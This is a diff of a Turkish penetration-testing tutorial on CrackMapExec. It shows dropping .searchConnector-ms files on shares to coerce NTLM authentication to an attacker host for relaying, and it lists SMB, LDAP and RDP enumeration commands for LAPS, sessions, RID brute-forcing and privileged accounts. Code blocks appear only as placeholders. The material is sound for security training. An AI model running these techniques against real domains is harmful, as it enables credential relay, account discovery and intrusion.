-Bu bölümü tamamlamadan önce, **LNK** dışındaki bir dosya formatı kullanarak kimlik doğrulamayı zorlamanın başka bir yöntemine bakalım:[ **.searchConnector-ms**](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry) ve **.library-ms** formatları. Bu dosya formatlarının çoğu Windows sürümünde varsayılan dosya ilişkilendirmeleri bulunur. Windows ile entegre olarak, belirtilen bir WebDAV paylaşımı gibi uzaktaki bir konumu gösterebilecek şekilde, herhangi bir konumdan içerik görüntülemelerini sağlarlar.
 
-Özünde, LNK dosyası ile aynı fonksiyonu yerine getirirler. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için Windows'ta search connectors ve library dosyalarını keşfetmek başlıklı [blog](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/) yazısını okuyabilirsiniz.
+Bu bölümü tamamlamadan önce, **LNK** dışında başka bir dosya formatı kullanarak kimlik doğrulamasını zorlamanın başka bir yöntemine bakalım: **[.searchConnector-ms](https://learn.microsoft.com/en-us/windows/win32/search/search-sconn-desc-schema-entry)** ve **`.library-ms`** formatları. Bu dosya formatlarının çoğu Windows sürümünde **varsayılan dosya ilişkilendirmeleri** bulunur. Windows ile entegre çalışarak içeriği rastgele bir konumdan, hatta **`WebDAV` paylaşımıyla belirtilen remote bir konumdan** gösterebilirler.
 
-CrackMapExec, paylaşılan bir klasörde bir searchConnector-ms dosyası oluşturmamızı sağlayan drop-sc adlı bir modüle sahiptir. Bunu kullanmak için, SMB fake sunucumuzu hedeflemek için URL seçeneğini belirtmemiz gerekir. Bu durumda, ntlmrelayx çalıştıran hostumuz. URL'nin çift ters eğik çizgi (\) ile kaçması gerekir, örneğin: URL=\\\\10.10.14.33\\secret .
+Özetle, bu dosyalar **LNK** dosyasıyla aynı işlevi görür. Bu yöntemin keşfi hakkında daha fazla bilgi edinmek için **"[Exploring search connectors and library files in Windows](https://dtm.uk/exploring-search-connectors-and-library-files-on-windows/)"** başlıklı blog yazısını okuyabiliriz.
+
+CrackMapExec, **`drop-sc`** adında bir modüle sahiptir. Bu modül, paylaşılan bir klasörde **`searchConnector-ms`** dosyası oluşturmamıza olanak tanır. Kullanabilmek için **URL** seçeneğini belirterek **SMB fake sunucumuzu** hedef göstermemiz gerekir. Bu durumda, **`ntlmrelayx`** çalıştıran hostumuz olacaktır. **URL** değeri çift ters eğik çizgi (`\`) ile kaçırılmalıdır. Örneğin: **`URL=\\10.10.14.33\secret`**.
 
 İsteğe bağlı olarak aşağıdaki seçenekleri belirleyebiliriz:
 
-* SHARE=name seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı WRITE izinlerine sahip tüm paylaşımlara yazacaktır
+* `SHARE=name` seçeneği ile hedef paylaşımlı klasör . Bu seçeneği belirtmezsek, dosyayı `WRITE` izinlerine sahip tüm paylaşımlara yazacaktır
 
-* FILENAME=name seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “Belgeler” adında bir dosya oluşturacaktır.
+* `FILENAME=name` seçeneği ile dosya adı . Bu seçeneği belirtmezsek, “`Documents`” adında bir dosya oluşturacaktır.
 
-* Oluşturduğumuz dosyaları temizlemek istiyorsak CLEANUP=True seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
+* Oluşturduğumuz dosyaları temizlemek istiyorsak `CLEANUP=True` seçeneği. Eğer özel bir isim kullanacaksak filename seçeneğini belirtmemiz gerekiyor.
 
 Drop-sc'yi iş başında görelim:
 
-
 ### Dropping a searchConnector-ms File
 
-![Pasted image 20241202202007.png](/img/user/resimler/Pasted%20image%2020241202202007.png)
+{{CODE_BLOCK_122}}
 
-![Pasted image 20241202202025.png](/img/user/resimler/Pasted%20image%2020241202202025.png)
+{{CODE_BLOCK_123}}
 
-Bir kullanıcı paylaşılan klasöre eriştiğinde ve ntlmrelayx dinlerken, hedef makineye de aktarım yapabilmeliyiz.
+Bir kullanıcı **paylaşılan klasöre** eriştiğinde ve **ntlmrelayx** dinleme modunda çalışırken, kimlik bilgilerini **hedef makineye yönlendirebilmemiz** gerekir.
 
+### NTLMRelayx ve drop-sc Kullanarak Yönlendirme
 
-### NTLMRelayx ve drop-sc Kullanarak Aktarma
+{{CODE_BLOCK_124}}
 
-![Pasted image 20241202202103.png](/img/user/resimler/Pasted%20image%2020241202202103.png)
-![Pasted image 20241202202112.png](/img/user/resimler/Pasted%20image%2020241202202112.png)
-
-Son olarak, CLEANUP=True seçeneği ile .searchConnector-ms dosyasını temizleyebiliriz:
+Son olarak, `CLEANUP=True` seçeneği ile `.searchConnector-ms` dosyasını temizleyebiliriz:
 
 
 ### searchConnector-ms Dosyalarını Temizleme
-![Pasted image 20241202202155.png](/img/user/resimler/Pasted%20image%2020241202202155.png)
-![Pasted image 20241202202201.png](/img/user/resimler/Pasted%20image%2020241202202201.png)
 
-LNK dosyaları genellikle bu tür saldırılar için bilinir. .searchConnector-ms gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+{{CODE_BLOCK_125}}
 
 
-### SMB ile Eşleme ve Numaralandırma
+LNK dosyaları genellikle bu tür saldırılar için bilinir. `.searchConnector-ms` gibi başka bir dosya türü kullanmak, fark edilmemenize yardımcı olabilir.
+
+Sonraki bölümlerde CrackMapExec'in keşif seçeneklerini inceleyeceğiz.
+
+---
+
+
+### SMB ile Mapping ve Enumeration
 
 CrackMapExec, geçerli bir domain kullanıcı hesabıyla numaralandırma söz konusu olduğunda çok daha fazla seçenekle birlikte gelir. En çok kullanılan seçenekleri ele aldık, ancak daha derine inelim. İşte ayrıcalıklı olmasa bile geçerli bir hesap aldığımızda kullanabileceğimiz tüm seçeneklerin listesi:
 
-![Pasted image 20241202202635.png](/img/user/resimler/Pasted%20image%2020241202202635.png)
-![Pasted image 20241202202649.png](/img/user/resimler/Pasted%20image%2020241202202649.png)
+| Komut                                                                 | Açıklama                                                          |
+| --------------------------------------------------------------------- | ----------------------------------------------------------------- |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --loggedon-users` | Hedefte oturum açmış kullanıcıları listeler.                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --sessions`       | Hedefteki aktif oturumları listeler.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --disks`          | Hedefteki diskleri listeler.                                      |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --computers`      | Hedef ağdaki bilgisayarları listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi`            | Belirtilen WMI sorgusunu çalıştırır.                              |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --wmi-namespace`  | WMI Namespace’ini belirtir (varsayılan: `root\cimv2`).            |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --rid-brute`      | Hedef üzerinde RID brute-force yöntemiyle kullanıcıları listeler. |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --local-groups`   | Local grupları listeler; grup belirtilirse üyelerini listeler.    |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --shares`         | Hedefteki tüm paylaşım izinlerini listeler.                       |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --users`          | Hedefteki domain kullanıcılarını listeler.                        |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --groups`         | Hedefteki domain gruplarını listeler.                             |
+| `crackmapexec smb <hedef> -u <kullanıcı> -p <şifre> --pass-pol`       | Domainin password policy'sini gösterir.                           |
 
 Daha önce çalışmamış olanları gözden geçirelim:
 
-### Hedefteki etkin oturumları / oturum açmış kullanıcıları numaralandırma
+### Hedefteki aktif oturumları / oturum açmış kullanıcıları numaralandırma
 
-Birden fazla hedefi tehlikeye attıysak, etkin oturumları kontrol etmeye değer olabilir, belki bir domain yöneticisi vardır ve çabamızı bu belirli hedefe odaklamamız gerekir. Bir bilgisayardaki kullanıcıları tanımlamak için --sessions ve --loggedon-users seçeneklerini kullanabiliriz. Oturumlar, kullanıcı oturum açmamış olsa bile kullanıcı kimlik bilgilerinin hedef makinede kullanıldığı anlamına gelir. Oturum açmış kullanıcılar kendi kendini açıklar; bir kullanıcının hedef makinede oturum açtığı anlamına gelir. Bloodhound, aktif oturumları bulmak için kullanabileceğimiz başka bir araçtır.
+Birden fazla hedefi ele geçirmişsek, aktif oturumları kontrol etmek faydalı olabilir, belki bir domain administrator vardır ve bu belirli hedefe odaklanmamız gerekebilir. Bir bilgisayardaki kullanıcıları tespit etmek için `--sessions` ve `--loggedon-users` seçeneklerini kullanabiliriz. Session'lar, kullanıcının hedef makinede giriş yapmıyor olsa da kullanıcı kimlik bilgileriyle oturum açıldığı anlamına gelir. Giriş yapmış kullanıcılar ise kendiliğinden anlaşılır; bir kullanıcının hedef makineye giriş yapmış olduğunu ifade eder. `BloodHound`, aktif oturumları bulmak için kullanabileceğimiz bir diğer araçtır.
 
 
 ### Sessions ve loggendon-users seçeneklerini kullanma
-![Pasted image 20241202203026.png](/img/user/resimler/Pasted%20image%2020241202203026.png)
 
-Belirli bir kullanıcıyı arıyorsak, --loggedon-users-filter seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, regex'i de destekler.
+{{CODE_BLOCK_126}}
+
+Belirli bir kullanıcıyı arıyorsak, -`-loggedon-users-filter` seçeneğini ve ardından aradığımız kullanıcının adını kullanabiliriz. Birden fazla kullanıcı arıyorsak, `regex`'i de destekler.
 
 
 ### Oturum açmış kullanıcılarla filtre seçeneğini kullanma
-![Pasted image 20241202203114.png](/img/user/resimler/Pasted%20image%2020241202203114.png)
-![Pasted image 20241202203120.png](/img/user/resimler/Pasted%20image%2020241202203120.png)
+
+{{CODE_BLOCK_127}}
+
+Not: Genellikle, `--loggedon-users` veya `--sessions` parametrelerinin başarılı bir şekilde çalıştırılabilmesi için administrator izinleri gereklidir.
+
 
 
 ### Enumerate Computers
 
 CME ayrıca domain bilgisayarlarını da listeleyebilir ve bunu bir LDAP isteği gerçekleştirerek yapar
 
-
 ### Domain'deki Bilgisayarları Numaralandırma
-![Pasted image 20241202203511.png](/img/user/resimler/Pasted%20image%2020241202203511.png)
+
+{{CODE_BLOCK_128}}
+
 
 Not: Bu seçenek yalnızca SMB protokolünde mevcut olsa da, CME bir LDAP sorgusu yapmaktadır.
 
 
 ### Enumerate LAPS
 
-Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, --laps seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya --sam gibi diğer seçenekleri kullanabiliriz.
+Local Administrator Password Solution (LAPS), domain'e bağlı bilgisayarların local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL tarafından korunur, böylece yalnızca uygun kullanıcılar bunları okuyabilir veya sıfırlama talebinde bulunabilir. LAPS domain içinde kullanılıyorsa ve LAPS şifrelerini okuyabilen bir hesabı tehlikeye atarsak, `--laps` seçeneğini bir hedef listesi ile kullanabilir ve komutları çalıştırabilir veya `--sam` gibi diğer seçenekleri kullanabiliriz.
 
-![Pasted image 20241202203817.png](/img/user/resimler/Pasted%20image%2020241202203817.png)
 
-![Pasted image 20241202203835.png](/img/user/resimler/Pasted%20image%2020241202203835.png)
+{{CODE_BLOCK_129}}
 
-![Pasted image 20241202203857.png](/img/user/resimler/Pasted%20image%2020241202203857.png)
-
-Not: Varsayılan yönetici hesabı adı “administrator” değilse, kullanıcı adını --laps kullanıcı adı seçeneğinden sonra ekleyin.
-
+Not: Eğer varsayılan administrator hesap adı "`administrator`" değilse, -`-laps username` seçeneğinden sonra kullanıcı adını ekleyin.
 
 ### Hedefteki RID'yi Brute-forcing yaparak Kullanıcıları Numaralandır --rid-brute
 
-Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için RID Bruteforce'dur. BloodHound veya PowerView ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in --rid-brute seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
+Nadiren kullanılan bir özellik, kullanıcı listeleri oluşturmak için `RID Bruteforce`'dur. `BloodHound` veya `PowerView` ile bir kullanıcı listesi oluşturabiliriz. Ancak, bu teknikler muhtemelen yakalanacak ve kurulumu biraz zaman alacaktır. CrackMapExec'in `--rid-brute` seçeneğini kullanarak, UserID'sini brute forcing yaparak bir kullanıcı listesi toplamak mümkündür.
 
 
 ### List Local Users
 
-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
